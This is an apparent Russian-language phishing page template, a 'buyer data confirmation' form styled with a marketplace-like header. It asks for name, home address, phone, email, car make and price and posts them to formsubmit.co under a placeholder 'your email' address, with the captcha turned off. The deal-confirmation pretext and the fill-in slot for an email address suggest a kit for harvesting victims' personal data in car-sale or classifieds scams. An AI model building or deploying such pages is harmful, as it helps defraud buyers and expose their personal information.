<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<title>Подтверждение данных покупателя</title>

<style>
body {
    margin: 0;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
    background-color: #f5f7fa;
    color: #1a1a1a;
}

/* HEADER */
.na-header {
    background: #CC3300;
    border-bottom: 1px solid #b52b00;
    height: 64px;
    display: flex;
    align-items: center;
}
.na-header-inner {
    max-width: 1200px;
    width: 100%;
    margin: 0 auto;
    padding: 0 20px;
}
.na-logo {
    height: 34px;
}

/* FORM CARD */
.container {
    max-width: 520px;
    margin: 40px auto;
    background: #ffffff;
    border-radius: 8px;
    padding: 30px;
    box-shadow: 0 2px 8px rgba(0,0,0,0.08);
}

h1 {
    font-size: 22px;
    margin-bottom: 10px;
}

.description {
    font-size: 14px;
    color: #555;
    margin-bottom: 25px;
}

label {
    display: block;
    font-weight: 600;
    margin-top: 15px;
    font-size: 14px;
}

input {
    width: 100%;
    padding: 12px;
    margin-top: 6px;
    border-radius: 6px;
    border: 1px solid #cfd6e0;
    font-size: 14px;
}

input:focus {
    outline: none;
    border-color: #CC3300;
}

button {
    width: 100%;
    margin-top: 30px;
    padding: 14px;
    background-color: #CC3300;
    color: #ffffff;
    font-size: 16px;
    font-weight: 600;
    border: none;
    border-radius: 6px;
    cursor: pointer;
}

button:hover {
    background-color: #b52b00;
}

.notice {
    margin-top: 20px;
    font-size: 12px;
    color: #666;
    line-height: 1.4;
}
</style>
</head>

<body>

<!-- HEADER -->
<header class="na-header">
  <div class="na-header-inner">
    <img src="logo.png" alt="Logo" class="na-logo">
  </div>
</header>

<!-- FORM -->
<div class="container">

    <h1>Подтверждение данных покупателя</h1>
    <div class="description">
        Пожалуйста, заполните информацию для завершения сделки.
    </div>

    <form action="https://formsubmit.co/ТВОЙ_EMAIL@gmail.com" method="POST">

        <label>Имя</label>
        <input type="text" name="Имя" placeholder="Введите ваше имя" required>

        <label>Адрес</label>
        <input type="text" name="Адрес" placeholder="Введите адрес проживания" required>

        <label>Номер телефона</label>
        <input type="tel" name="Телефон" placeholder="+7 XXX XXX-XX-XX" required>

        <label>Email</label>
        <input type="email" name="Email" placeholder="example@email.com" required>

        <label>Марка автомобиля</label>
        <input type="text" name="Марка авто" placeholder="Например: BMW, Audi" required>

        <label>Цена (€)</label>
        <input type="number" name="Цена" placeholder="Введите стоимость" required>

        <!-- FormSubmit settings -->
        <input type="hidden" name="_subject" value="Новое подтверждение сделки">
        <input type="hidden" name="_captcha" value="false">
        <input type="hidden" name="_next" value="https://alfredodefaro-ai.github.io/form/success.html">

        <button type="submit">Подтвердить данные</button>
    </form>

    <div class="notice">
        Данные используются исключительно для подтверждения сделки.
    </div>

</div>

</body>
</html>
